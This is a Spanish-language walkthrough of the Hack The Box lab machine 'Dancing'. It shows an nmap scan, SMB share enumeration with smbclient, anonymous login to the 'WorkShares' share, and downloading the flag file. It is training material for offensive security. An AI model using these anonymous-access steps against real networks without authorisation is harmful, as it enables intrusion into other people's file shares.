
# Dancing (Hack The Box)

## 1. Fase de Reconocimiento y Enumeración

### Identificación del Servicio

La máquina "Dancing" es una máquina Windows. El objetivo inicial es identificar qué servicios están corriendo en la IP de la víctima.

### Escaneo de Puertos con Nmap

Se realiza un escaneo de puertos para detectar servicios abiertos:

```bash
# Escaneo de puertos abiertos y detección de servicios
nmap -sV <IP-Victima>
```

**Resultados del escaneo [[04:01](http://www.youtube.com/watch?v=X7WiM498vRw&t=241)]:**

* **Puerto 135:** msrpc
* **Puerto 139:** netbios-ssn
* **Puerto 445:** **microsoft-ds (SMB)**

El puerto **445** es el más interesante, ya que corre el protocolo **SMB (Server Message Block)**, utilizado para compartir archivos e impresoras en redes Windows.

---

## 2. Enumeración de SMB

### Listado de Recursos Compartidos (Shares)

Para interactuar con SMB desde Linux, se utiliza la herramienta `smbclient`. Primero, listamos los recursos compartidos disponibles sin proporcionar una contraseña (presionando Enter cuando la pida):

```bash
# Listar recursos compartidos (usando el flag -L)
smbclient -L <IP-Victima>
```

**Recursos detectados [[06:10](http://www.youtube.com/watch?v=X7WiM498vRw&t=370)]:**

* `ADMIN$` (Administrativo)
* `C$` (Administrativo)
* `IPC$` (Comunicación entre procesos)
* **`WorkShares`** (Recurso compartido de trabajo - **Accesible**)

Los recursos que terminan en `$` suelen ser administrativos y requieren credenciales, pero `WorkShares` parece ser un recurso común.

---

## 3. Ganando Acceso y Exfiltración (Foothold)

### Conexión al recurso compartido

Nos conectamos al recurso `WorkShares`. Nota: La sintaxis de `smbclient` requiere barras invertidas escapadas:

```bash
# Conexión al recurso específico
smbclient \\\\<IP-Victima>\\WorkShares
```

*(Al pedir contraseña, simplemente se presiona **Enter** para entrar como usuario anónimo)*.

### Navegación y descarga de archivos

Una vez dentro de la shell de SMB (similar a una shell de FTP), exploramos el contenido:

```smb
# Listar directorios
ls

# Entrar en la carpeta de Amy
cd Amy
ls
get WorkNotes.txt
cd ..

# Entrar en la carpeta de James
cd James
ls
```

Dentro de la carpeta de **James**, se encuentra el archivo de la flag:

```smb
# Descargar la flag a nuestra máquina local
get flag.txt
exit
```

---

## 4. Lectura de la Flag

Finalmente, en nuestra terminal local, leemos el contenido del archivo descargado:

```bash
cat flag.txt
```